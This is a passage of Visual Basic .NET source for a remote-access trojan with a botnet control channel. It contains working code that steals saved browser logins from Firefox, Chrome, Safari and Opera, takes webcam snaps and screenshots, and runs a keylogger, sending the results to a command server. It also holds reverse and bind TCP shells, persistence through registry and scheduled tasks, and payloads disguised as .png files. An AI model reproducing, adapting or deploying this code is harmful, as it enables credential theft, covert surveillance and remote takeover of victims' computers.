                        Else
                            If IO.File.Exists(f) Then
                                Try
                                    IO.File.Delete(f)
                                Catch ex As Exception
                                End Try
                            End If
                        End If
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("mkdir ")
                        Dim f = cmnd.Remove(0, 6)
                        If Not IO.Directory.Exists(f) Then IO.Directory.CreateDirectory(f)
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("ren ")
                        Dim f = cmnd.Remove(0, 4)
                        Dim oldn = f.Split("|")(0)
                        Dim newn = f.Split("|")(1)
                        If IO.Directory.Exists(oldn) Then
                            Try
                                Dim di As New IO.DirectoryInfo(oldn)
                                di.MoveTo(newn)
                            Catch ex As Exception
                            End Try
                        ElseIf IO.File.Exists(oldn) Then
                            Try
                                Dim fi As New IO.FileInfo(oldn)
                                fi.MoveTo(newn)
                            Catch ex As Exception
                            End Try
                        End If
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("touch ")
                        Dim f = cmnd.Remove(0, 6)
                        If Not IO.File.Exists(f) Then IO.File.Create(f)
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    End If
                End If
            Next
        Catch ex As Exception
            log_all("docmds function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Do Commands.
    Sub GB()
st:
        Try
            IO.File.WriteAllText(path & "\goodbye.bat", "timeout 5" & vbNewLine & "del /f /q /s *")
            If onTor Then
                Try
                    For Each p In Process.GetProcessesByName("tor")
                        Try
                            If p.MainModule.FileName = path & "\Tor\tor.exe" Then
                                torP = p : Exit For
                            End If
                        Catch ex As Exception
                        End Try
                    Next
                    torP.Kill()
                Catch ex As Exception
                End Try
                Try
                    For Each p In Process.GetProcessesByName("polipo")
                        Try
                            If p.MainModule.FileName = path & "\Tor\polipo.exe" Then
                                polipoP = p : Exit For
                            End If
                        Catch ex As Exception
                        End Try
                    Next
                    polipoP.Kill()
                Catch ex As Exception
                End Try
            End If
            regdel("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", botid)
            If CH() Then GPO("cmd", "/C schtasks /delete /tn " & botid & " /f")
        Catch ex As Exception
            log_all("GB function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        If IO.File.Exists(path & "\goodbye.bat") Then
            Dim p = New Process
            p.StartInfo = New ProcessStartInfo("cmd", "/C " & path & "\goodbye.bat")
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            End
        End If
        GoTo st
    End Sub ' Goodbye function.
    Private Declare Function GetLastInputInfo Lib "user32.dll" (ByRef inputStructure As inputInfo) As Boolean
    Private Structure inputInfo
        Dim structSize As Int32
        Dim tickCount As Int32
    End Structure
    Dim info As inputInfo
    Dim firstTick As Int32
    Dim lastTick As Int32
    Sub Idle()
        info.structSize = Len(info)
        GetLastInputInfo(info)
        Dim tn As Integer = TimeSpan.FromMilliseconds(Environment.TickCount - info.tickCount).TotalSeconds.ToString("#")
        Dim ts As String = TimeSpan.FromSeconds(tn).Hours.ToString & "H:" & TimeSpan.FromSeconds(tn).Minutes.ToString & "M:" & TimeSpan.FromSeconds(tn).Seconds.ToString
        docmds(UploadFile(SB("User've been idle for " & ts & "S"), "idle.log", "logs"))
    End Sub ' Get Idle time of the user.
    Sub DKL()
        If Not klp Is Nothing Then klp.Kill()
    End Sub ' Disable KeyLogger.
    Sub EKL()
        DEC()
        klp = Process.Start("c:\windows\system32\cmd.exe", "/C """ & path & """\kl.png")
    End Sub ' Enable KeyLogger.
    Function UploadFile(data As Byte(), fname As String, Optional folder As String = "") As String
        UploadFile = ""
        If folder <> "" Then folder = "&folder=" & folder
        Dim url = server & aps & "connect.php?password=" & password & "&type=upload&botid=" & botid & "&file=" & fname & folder
        Try
            If IO.File.Exists(fname) Then IO.File.Delete(fname)
            IO.File.WriteAllBytes(fname, data)
            If IO.File.Exists(fname) Then UploadFile = BS(a.UploadFile(url, "PUT", fname))
            If IO.File.Exists(fname) Then IO.File.Delete(fname)
        Catch ex As Exception
            log_all("UploadFile-Bytes function: " & ex.Message & vbNewLine & url)
        End Try
    End Function ' Upload a file from bytes.
    Function UploadFile(file As String, fname As String, Optional folder As String = "") As String
        UploadFile = ""
        If Not CUH(server) Then Return ""
        If folder <> "" Then folder = "&folder=" & folder
        Dim url = server & aps & "connect.php?password=" & password & "&type=upload&botid=" & botid & "&file=" & fname & folder
        Try
            If IO.File.Exists(file) Then
                Try
                    Return BS(a.UploadFile(url, "PUT", file))
                Catch ex As Exception
                    log_all("UploadFile-Path function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            End If
        Catch ex As Exception
            log_all("UploadFile-Path function: " & ex.Message & vbNewLine & url)
        End Try
    End Function ' Upload a file from path.
    Function Post(data As String) As String
        Net.ServicePointManager.Expect100Continue = False
        Post = ""
        Dim url = server & aps & "connect.php?password=" & password
        Try
            a.Headers.Add("Content-Type: application/x-www-form-urlencoded")
            Post = a.UploadString(url, data & "&botid=" & botid)
        Catch ex As Exception
            log_all("Post function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Post (The default action to connect [more are coming]).
    Function CA(ByVal URL As String) As Boolean
        Dim response As Net.HttpWebResponse
        Try
            Dim request As Net.WebRequest = Net.WebRequest.Create(URL)
            request.Proxy = a.Proxy
            response = request.GetResponse()
            If Not response.StatusCode = 200 Then
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function ' Check availability.
    Sub DownloadFile(sf As String, df As String)
        Try
            Dim tmpdf = df
            If Not CA(sf) Then Exit Sub
            If df.Contains("?") Then
                tmpdf = df.Split("?")(1)
                If tmpdf.Contains("=") Then
                    If tmpdf.Contains("&") Then
                        For Each p In tmpdf.Split("&")
                            Dim part = p.Split("=")(0)
                            If part.ToLower.Contains("file") Then
                                tmpdf = p.Split("=")(1)
                                If tmpdf = "" Then tmpdf = df
                            End If
                        Next
                    Else
                        Dim part = tmpdf.Split("=")(0)
                        If part.ToLower.Contains("file") Then
                            tmpdf = tmpdf.Split("=")(1)
                            If tmpdf = "" Then tmpdf = df
                        End If
                    End If
                End If
            End If
            Try
                Dim t = Net.WebRequest.Create(sf)
                t.Proxy = a.Proxy
                Dim f = t.GetResponse.Headers.GetValues("Content-Disposition")
                If f.Length = 0 Then GoTo nthere
                For Each v In f
                    If v.ToLower.Contains("filename") Then
                        tmpdf = v.Split("=")(1)
                    End If
                Next
nthere:
            Catch ex As Exception
                log_all("DownloadFile Function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
            df = tmpdf
            Dim fc() As Byte = a.DownloadData(sf)
            IO.File.WriteAllBytes(df, fc)
        Catch ex As Exception
            log_all("DownloadFile Function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Download a file.
    Sub MC(s As String, p As String, pw As String, n As String, id As String, i As String, w As String, nc As String, r As String, k As String, c As String, wf As String, au As String, ap As String)
        Dim data = "[SERVER|" & s & "][APS|" & p & "][PASSWORD|" & pw & "][BOTNAME|" & n & "][BOTID|" & id & "][INSTALL|" & i & "][WTIME|" & w & "][NIRCMD|" & nc & "][RCMD|" & r & "][KL|" & k & "][CC|" & c & "][WFMF|" & wf & "][APSSHUSER|" & au & "][APSSHPASS|" & ap & "]"
        My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1), SB(data), RegistryValueKind.Binary)
    End Sub ' Make Configs.
    Function SB(ByRef S As String) As Byte()
        Try
            Return System.Text.Encoding.UTF8.GetBytes(S)
        Catch ex As Exception
            log_all("SB function: " & ex.Message & vbNewLine & ex.StackTrace)
            Try
                Return System.Text.Encoding.Default.GetBytes(S)
            Catch ex1 As Exception
                Return System.Text.Encoding.Default.GetBytes("")
            End Try
        End Try
    End Function ' Strings to bytes.
    Function BS(ByRef B As Byte()) As String
        Try
            Return System.Text.Encoding.UTF8.GetString(B)
        Catch ex As Exception
            Try
                Return System.Text.Encoding.Default.GetString(B)
            Catch ex1 As Exception
                Return ""
            End Try
        End Try
    End Function ' Bytes to string.
    Sub CMP()
        Try
            Dim melt As Boolean = False
            If Environment.UserName.ToUpper = "SYSTEM" Then Exit Sub
            If Process.GetCurrentProcess.MainModule.FileName.ToLower.EndsWith("-melt.exe") Then melt = True
            Dim there As Boolean = False
            Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
            For Each n In rgkey.GetValueNames()
                If n = Process.GetCurrentProcess.ProcessName Then there = True
            Next
            If Not there Then
                RegHide()
                Dim pr = New Process
                pr.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/C ""timeout 5 && " & My.Resources.powershell.Replace("^N^", Process.GetCurrentProcess.ProcessName).Replace("^E^", "exe") & """")
                pr.StartInfo.UseShellExecute = False
                pr.StartInfo.CreateNoWindow = True
                pr.Start()
                If melt Then
                    Dim pr1 = New Process
                    pr1.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/C ""timeout 5 && del /f /q /s """ & Process.GetCurrentProcess.MainModule.FileName & """""")
                    pr1.StartInfo.UseShellExecute = False
                    pr1.StartInfo.CreateNoWindow = True
                    pr1.Start()
                End If
                End
            Else
                If regread("lastdir") <> "" Then
                    Dim ld = regread("HKEY_CURRENT_USER\Software\APS", "lastdir")
                    If IO.File.Exists(ld & "\Tor\tor.exe") Then
                        If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
                        For Each f In IO.Directory.GetFiles(ld & "\Tor")
                            IO.File.Copy(f, path & "\Tor\" & f.Remove(0, f.LastIndexOf("\") + 1))
                        Next
                    End If
                    If IO.Directory.Exists(ld) Then IO.Directory.Delete(ld, True)
                End If
                regwrite("HKEY_CURRENT_USER\Software\APS", "lastdir", path)
            End If
        Catch ex As Exception
            log_all("CMP function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Check My Path.
    Sub LS()
        If RegCheck(configfile.Remove(0, configfile.LastIndexOf("\") + 1)) Then
            GS("server", server)
            GS("aps", aps)
            GS("password", password)
            GS("wtime", wtime)
            GS("botname", botname)
            GS("botid", botid)
            If botid = "" Then log_all("LS function: Bot ID was not set! Setting a new one...", 0) : botid = GetSerial("c:\") : SS("botid", botid)
            GS("install", install)
            GS("KL", kl)
            GS("NIRCMD", nircmd)
            GS("rcmd", rcmd)
            GS("cc", cc)
            GS("wfmf", wfmf)
            GS("apsshuser", apsshuser)
            GS("apsshpass", apsshpass)
            Exit Sub
        End If
        log_all("LS function: First run or Config File was erased. Making a new one ...", 1)
        If botid = "" Then botid = GetSerial("c:\")
        MC(server, aps, password, botname, botid, install, wtime, nircmd, rcmd, kl, cc, wfmf, apsshuser, apsshpass)
    End Sub ' Load Settings.
    Sub GS(name As String, ByRef value As String)
        Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS")
        If rgkey.ValueCount > 0 And Not BS(rgkey.GetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1))) = "" Then
            Dim data = BS(rgkey.GetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1)))
            Dim confs = Split(data, "]")
            For Each conf In confs
                If conf.ToLower.StartsWith("[" & name.ToLower) Then
                    Dim tvalue = conf.Substring(name.Length + 2, Split(conf.ToLower, "[" & name.ToLower & "|")(1).Length)
                    If tvalue <> "" Then value = tvalue
                    SS(name, value)
                    Exit Sub
                End If
            Next
            log_all("GS Function: No such a setting! (" & name & ")")
            Exit Sub
        End If
        log_all("GS Function: Config File was not found. Making a new one ...", 0)
        MC(server, aps, password, botname, botid, install, wtime, nircmd, rcmd, kl, cc, wfmf, apsshuser, apsshpass)
    End Sub ' Get Setting.
    Sub SS(name As String, value As String)
        Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS")
        If rgkey.ValueCount > 0 And Not BS(rgkey.GetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1))) = "" Then
            Dim data = BS(rgkey.GetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1)))
            Dim confs = Split(data, "]")
            For Each conf In confs
                If conf.ToLower.StartsWith("[" & name.ToLower) Then
                    data = data.Replace(conf, "[" & name.ToUpper & "|" & value)
                    rgkey.SetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1), SB(data), RegistryValueKind.Binary)
                    Exit Sub
                End If
            Next
            log_all("SS Function: No such a setting! (" & name & "). Adding it now...")
            data += "[" & name.ToUpper & "|" & value & "]"
            rgkey.SetValue(configfile.Remove(0, configfile.LastIndexOf("\") + 1), SB(data), RegistryValueKind.Binary)
            Exit Sub
        End If
        log_all("SS Function: Config File was not found. Making a new one ...", 0)
        MC(server, aps, password, botname, botid, install, wtime, nircmd, rcmd, kl, cc, wfmf, apsshuser, apsshpass)
    End Sub ' Set Setting.
    Function GetRND(Optional len As Integer = 10) As String
        Dim chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim outc = ""
        Dim r = New Random
        For i = 0 To len - 1
            outc += chars(r.Next(0, chars.Length - 1))
        Next
        Return outc
    End Function ' Get a Random string of length 10 by default.
    Sub DEC()
        For Each n In {"cc.png", "rcmd.png", "nircmd.png", "kl.png", "wfmf.png"}
            If Not RegCheck(n) Then
                ED(n)
            End If
        Next
    End Sub ' Do Extra Check.
    Sub ED(e As String)
        If Not e = "" And Not e = Nothing Then
            Try
                Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
                Dim url = ""
                Dim n = e
                Select Case e.ToLower
                    Case "cc.png"
                        url = cc
                    Case "rcmd.png"
                        url = rcmd
                    Case "nircmd.png"
                        url = nircmd
                    Case "kl.png"
                        url = kl
                    Case "wfmf.png"
                        url = wfmf
                    Case Else
                        url = e
                        If url.Contains("/") Then
                            n = url.Remove(0, url.LastIndexOf("/") + 1)
                        Else
                            n = e
                        End If
                End Select
                If Not CA(url) Then Exit Sub
                Dim byts() As Byte = a.DownloadData(url)
                Dim byt As New List(Of Byte)
                Dim lc = 0
                For Each b In byts
                    byt.Add(b)
                    If byt.Count = 500 * 1024 Then
                        rgkey.SetValue(n & "-" & GTC(lc, "0000"), byt.ToArray, RegistryValueKind.Binary)
                        byt.Clear()
                        lc += 1
                    End If
                Next
                If byt.Count > 0 Then
                    If lc > 0 Then
                        rgkey.SetValue(n & "-" & GTC(lc, "0000"), byt.ToArray, RegistryValueKind.Binary) : byt.Clear()
                    Else
                        rgkey.SetValue(n, byt.ToArray, RegistryValueKind.Binary) : byt.Clear()
                    End If
                End If
            Catch ex As Exception
                log_all("ED function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        End If
    End Sub ' Extra Download (download any missing extra file).
    Function WCC() As String
        WCC = "No"
        Try
            If Not RegCheck("cc.png") Then DEC()
            If Not RegCheck("cc.png") Then Return "Unknown"
            RegPool("cc.png", path & "\cc.png")
            If Not GPO("c:\windows\system32\cmd.exe", "/C """ & path & "\cc.png"" /devlist").Contains("No video devices found") Then WCC = "Yes"
            IO.File.Delete(path & "\cc.png")
        Catch ex As Exception
            log_all("WCC function:   " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' WebCam Check.
    Function WCS() As String
        WCS = ""
        If WCC() = "No" Then Return ""
        If Not RegCheck("cc.png") Then Return ""
        Dim url = server & aps & "connect.php?password=" & password & "&type=wcs&botid=" & botid
        Try
            RegPool("cc.png", path & "\cc.png")
            GPO("c:\windows\system32\cmd.exe", "/C """ & path & "\cc.png"" /filename """ & path & "\wcs.bmp"" /quiet")
            If IO.File.Exists(path & "\wcs.bmp") Then WCS = BS(a.UploadFile(url, "PUT", path & "\wcs.bmp")) : IO.File.Delete(path & "\wcs.bmp")
            IO.File.Delete(path & "\cc.png")
        Catch ex As Exception
            log_all("WCS function:   " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' WebCam-Snap.
    Function DSS() As String
        DSS = ""
        If Light Then Return ""
        If Not RegCheck("nircmd.png") Then DEC()
        If Not RegCheck("nircmd.png") Then Return ""
        Try
            If IO.File.Exists(path & "\dss.png") Then IO.File.Delete(path & "\dss.png")
        Catch ex As Exception
        End Try
        Dim url = server & aps & "connect.php?password=" & password & "&type=dss&botid=" & botid
        Try
            RegPool("nircmd.png", path & "\nircmd.png")
            If Environment.UserName.ToLower = "system" Then
                For Each u In Us()
                    Try
                        Dim utr = u.Split("|")(0)
                        If IO.File.Exists(path & "\dss.png") Then DSS = BS(a.UploadFile(url, "PUT", path & "\dss.png")) : IO.File.Delete(path & "\dss.png")
                        If GPO("c:\windows\system32\cmd.exe", "/C schtasks /create /tn dss /TR ""c:\windows\system32\cmd.exe /C " & path & "\nircmd.png savescreenshot """ & path & "\dss.png"""" /sc onlogon /ru " & utr & " /rl highest /f").Contains("successfully") Then
                            GPO("c:\windows\system32\cmd.exe", "/C schtasks /run /tn dss")
                            GPO("c:\windows\system32\cmd.exe", "/C schtasks /delete /tn dss /f")
                        End If
                    Catch ex As Exception
                    End Try
                Next
            Else
                GPO("c:\windows\system32\cmd.exe", "/C " & path & "\nircmd.png savescreenshot """ & path & "\dss.png""")
            End If
            If IO.File.Exists(path & "\dss.png") Then DSS = BS(a.UploadFile(url, "PUT", path & "\dss.png")) : IO.File.Delete(path & "\dss.png")
            IO.File.Delete(path & "\nircmd.png")
        Catch ex As Exception
            log_all("DSS function:   " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Desktop Screen-Shot.
    Function regread(key As String, Optional name As String = "") As String
        regread = My.Computer.Registry.GetValue(key, name, Nothing)
    End Function ' Read registery value.
    Function regwrite(key As String, name As String, value As String) As Boolean
        On Error Resume Next
        regwrite = True
        My.Computer.Registry.SetValue(key, name, value)
        If Err.Number <> 0 Then
            regwrite = False
            log_all("regwrite Function: " & Err.Description)
        End If
    End Function ' Write registery value.
    Function regdel(key As String, name As String) As Boolean
        On Error Resume Next
        regdel = True
        My.Computer.Registry.SetValue(key, name, "")
        If Err.Number <> 0 Then
            regdel = False
            log_all("regdel Function: " & Err.Description)
        End If
    End Function ' Delete registery value.
    Function defbro() As String  ' Default Browser
        On Error Resume Next
        defbro = regread("HKEY_CLASSES_ROOT\http\shell\open\command\")
        If Err.Number <> 0 Then
            log_all("defbro Function: " & Err.Description)
        End If
    End Function ' Default browser (Not yet used).
    Function do_firefox()
        On Error Resume Next
        Dim f, files, f1, d
        f = Environment.ExpandEnvironmentVariables("%appdata%") & "\Mozilla\Firefox\Profiles\"
        If Not (IO.Directory.Exists(f)) Then Exit Function
        For Each d In IO.Directory.GetDirectories(f)
            If InStr(d, ".default") Then
                files = New List(Of String)
                TryCast(files, List(Of String)).AddRange({"logins.json", "cert8.db", "key3.db"})
                For Each f1 In files
                    If IO.File.Exists(d & "\" & f1) Then
                        IO.File.Copy(d & "\" & f1, path & "\" & f1)
                        docmds(UploadFile(path & "\" & f1, f1, "Firefox"))
                        IO.File.Delete(path & "\" & f1)
                    End If
                Next
            End If
        Next
        If Err.Number <> 0 Then
            log_all("do_firefox Function: " & Err.Description)
        End If
    End Function ' Firefox logins stealer.
    Function do_chrome()
        On Error Resume Next
        If Not RegCheck("cl.png") Then ED(cl)
        If Not RegCheck("cl.png") Then Exit Function
        RegPool("cl.png", path & "\cl.png")
        docmds(UploadFile(SB(GPO("cmd", "/C """ & path & "\cl.png""")), "passwords.txt", "Chrome"))
        IO.File.Delete(path & "\cl.png")
        If Err.Number <> 0 Then
            log_all("do_chrome Function: " & Err.Description)
        End If
    End Function ' Chrome logins stealer.
    Function do_safari()
        On Error Resume Next
        Dim f, files, f1
        f = Environment.ExpandEnvironmentVariables("%appdata%") & "\Apple Computer\Preferences\"
        If Not (IO.Directory.Exists(f)) Then Exit Function
        files = New List(Of String)
        TryCast(files, List(Of String)).AddRange({"keychain.plist"})
        For Each f1 In files
            If IO.File.Exists(f & f1) Then
                IO.File.Copy(f & f1, path & "\" & f1)
                docmds(UploadFile(path & "\" & f1, f1, "Safari"))
                IO.File.Delete(path & "\" & f1)
            End If
        Next
        If Err.Number <> 0 Then
            log_all("do_safari Function: " & Err.Description)
        End If
    End Function ' Safari logins stealer.
    Function do_opera()
        On Error Resume Next
        Dim f, files, f1
        f = Environment.ExpandEnvironmentVariables("%appdata%") & "\Opera Software\Opera Stable\"
        If Not (IO.Directory.Exists(f)) Then Exit Function
        files = New List(Of String)
        TryCast(files, List(Of String)).AddRange({"Login Data"})
        For Each f1 In files
            If IO.File.Exists(f & f1) Then
                IO.File.Copy(f & f1, path & "\" & f1)
                docmds(UploadFile(path & "\" & f1, f1, "Opera"))
                IO.File.Delete(path & "\" & f1)
            End If
        Next
        If Err.Number <> 0 Then
            log_all("do_opera Function: " & Err.Description)
        End If
    End Function ' Opera logins stealer.
    Sub do_rcmd(f As String)
        Try
            Dim st = False
            If rcmdp Is Nothing Then st = True
            If st = False Then If rcmdp.HasExited Then st = True
            If st Then
                rcmdp = New Process
                rcmdp.StartInfo = New ProcessStartInfo(path & "\rcmd.png")
                rcmdp.StartInfo.UseShellExecute = False
                rcmdp.StartInfo.RedirectStandardInput = True
                rcmdp.StartInfo.RedirectStandardOutput = True
                rcmdp.StartInfo.RedirectStandardError = True
                rcmdp.StartInfo.UseShellExecute = False
                rcmdp.StartInfo.CreateNoWindow = True
                AddHandler rcmdp.OutputDataReceived, AddressOf rcmd_data
                AddHandler rcmdp.ErrorDataReceived, AddressOf rcmd_data
                rcmdp.Start()
                rcmdp.BeginErrorReadLine()
                rcmdp.BeginOutputReadLine()
            End If
            rcmdp.StandardInput.WriteLine(f)
        Catch ex As Exception
            log_all("do_rcmd function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Send commands to Remote CMD.
    Sub rcmd_data(sender As Object, e As DataReceivedEventArgs)
        Dim d = e.Data
        If d.EndsWith("EOO") Then d = d.Remove(d.Length - 3)
        docmds(UploadFile(SB(d), "rcmd.log", "logs"))
    End Sub ' Remote CMD output data handler.
    Function RTCP(host As String, port As String, Optional tor As Boolean = False) As Boolean
        RTCP = False
        Try
            Dim c_tcp As New Net.Sockets.TcpClient
            If tor Then
                c_tcp.Connect("localhost", 8123)
                With c_tcp.Client
                    .Send(SB("CONNECT " & host & ":" & port & " HTTP/1.1" & vbNewLine))
                    .Send(SB("" & vbNewLine))
                End With
                Do Until c_tcp.Available > 0
                Loop
                Dim b(9999) As Byte
                c_tcp.Client.Receive(b)
                If Not BS(b).ToLower.Contains("established") Then c_tcp.Close() : Return False
            Else
                c_tcp.Connect(host, port)
            End If
            log_all("RTCP function: Connected to """ & host & """ on port """ & port & """.", 3)
            TCP_DO(c_tcp)
            Return True
        Catch ex As Exception
            log_all("RTCP function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Reverse TCP function.
    Function BTCP(port As String) As Boolean
        BTCP = False
        Dim local As Boolean = False
        If port.ToLower.StartsWith("-l ") Then
            local = True
            port = port.Remove(0, 3)
        End If
        Try
            Dim IIP = Split(BS(a.DownloadData("http://jsonip.com")), """")(3)
            If local Then IIP = "127.0.0.1"
            Dim b_tcp As New Net.Sockets.TcpListener(Net.Dns.GetHostEntry("127.0.0.1").AddressList(0), port)
            b_tcp.Start()
            Dim c_tcp As New Net.Sockets.TcpClient(IIP, port)
            log_all("BTCP function: Port """ & port & """ is open.", 3)
            Dim bg As New BackgroundWorker
            AddHandler bg.DoWork, AddressOf bgwork
            bg.RunWorkerAsync(b_tcp)
            Return True
        Catch ex As Exception
            log_all("BTCP function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Bind TCP function.
    Sub bgwork(sender As Object, e As DoWorkEventArgs)
        Try
            Dim b_tcp As Net.Sockets.TcpListener = e.Argument
            Do While Not b_tcp.Pending
            Loop
            Dim TCP_C As Net.Sockets.TcpClient = b_tcp.AcceptTcpClient
            b_tcp.Stop()
            TCP_DO(TCP_C)
        Catch ex As Exception
            log_all("bgwork function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Bind TCP background worker.
    Sub TCP_DO(ByVal TCP_C As Net.Sockets.TcpClient)
        Dim TCP_BG As New BackgroundWorker
        AddHandler TCP_BG.DoWork, AddressOf TCP_CON
        TCP_BG.RunWorkerAsync(TCP_C)
    End Sub ' TCP do (Just turns any TCP to a background worker).
    Sub TCP_CON(sender As Object, e As DoWorkEventArgs)
        Dim TCP_C As Net.Sockets.TcpClient = e.Argument
        Dim loggedin = False
        Dim SH_P = New Process
        Dim lastcmd = ""
        Dim shdata As New List(Of String)
        Try
            Do While TCP_C.Client.Connected
                Try
                    Dim data(1024) As Byte
                    TCP_C.Client.Receive(data)
                    If BS(data).ToLower.Contains("be apssh") Then
                        Do Until loggedin
                            If Not TCP_C.Client.Connected Then Exit Sub
                            Dim tuser = ""
                            Dim tpass = ""
                            TCP_C.Client.Send(SB("APSSH User: "))
                            Do While Not TCP_C.Available > 0
                            Loop
                            Dim rt As New Windows.Forms.RichTextBox
                            TCP_C.Client.Receive(data)
                            rt.Text = BS(data)
                            Dim pregiven As Boolean = True
                            If rt.Lines.Length > 1 Then
                                For Each l In rt.Lines
                                    If l = "" Then pregiven = False
                                Next
                            End If
                            TCP_C.Client.Send(SB("APSSH Password: "))
                            If pregiven Then TCP_C.Client.Send(SB(vbNewLine))
                            If Not pregiven Then
                                Do While Not TCP_C.Available > 0
                                Loop
                                TCP_C.Client.Receive(data)
                                rt.AppendText(BS(data))
                            End If
                            If rt.Lines(0) = apsshuser Then
                                Dim md5pass As Security.Cryptography.MD5 = Security.Cryptography.MD5.Create
                                Dim b = md5pass.ComputeHash(SB(rt.Lines(2)))
                                If pregiven Then b = md5pass.ComputeHash(SB(rt.Lines(1)))
                                Dim sss As New Text.StringBuilder
                                For x As Integer = 0 To b.Length - 1
                                    sss.Append(b(x).ToString("x2"))
                                Next
                                If sss.ToString = apsshpass Then loggedin = True
                            End If
                            If Not loggedin Then TCP_C.Client.Send(SB("Incorrect User or Password!" & vbNewLine)) : rt.Text = "" : data = New Byte(1024) {}
                        Loop
                        Dim cd As New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim pt = username & "@" & pcname & ":" & cd.Name & "# "
                        TCP_C.Client.Send(SB(pt))
                        TCP_ReceiveSync(New StateObject(TCP_C.Client, SOType.APSSH)) : Exit Sub
                    ElseIf BS(data).ToLower.Contains("be shell") Then
                        SH_P.StartInfo = New ProcessStartInfo("C:\Windows\System32\cmd.exe")
                        SH_P.StartInfo.UseShellExecute = False
                        SH_P.StartInfo.CreateNoWindow = True
                        SH_P.StartInfo.RedirectStandardInput = True
                        SH_P.StartInfo.RedirectStandardError = True
                        SH_P.StartInfo.RedirectStandardOutput = True
                        SH_P.Start()
                        Dim byts1(4096) As Byte
                        Dim asr1 As New AsyncCallback(Sub(ar As IAsyncResult)
                                                          Dim s As IO.Stream = CType(ar.AsyncState(0), IO.Stream)
                                                          Dim a As AsyncCallback = CType(ar.AsyncState(1), AsyncCallback)
                                                          Dim read As Integer = s.EndRead(ar)
                                                          If read > 0 Then
                                                              Dim rtxt As New Windows.Forms.RichTextBox
                                                              rtxt.Text = BS(byts1)
                                                              For Each d In rtxt.Lines
                                                                  TCP_C.Client.Send(SB(vbNewLine & d))
                                                              Next
                                                              byts1 = New Byte(4096) {}
                                                              s.BeginRead(byts1, 0, byts1.Length, a, New Object() {s, a})
                                                          Else
                                                              s.Close()
                                                          End If
                                                      End Sub)
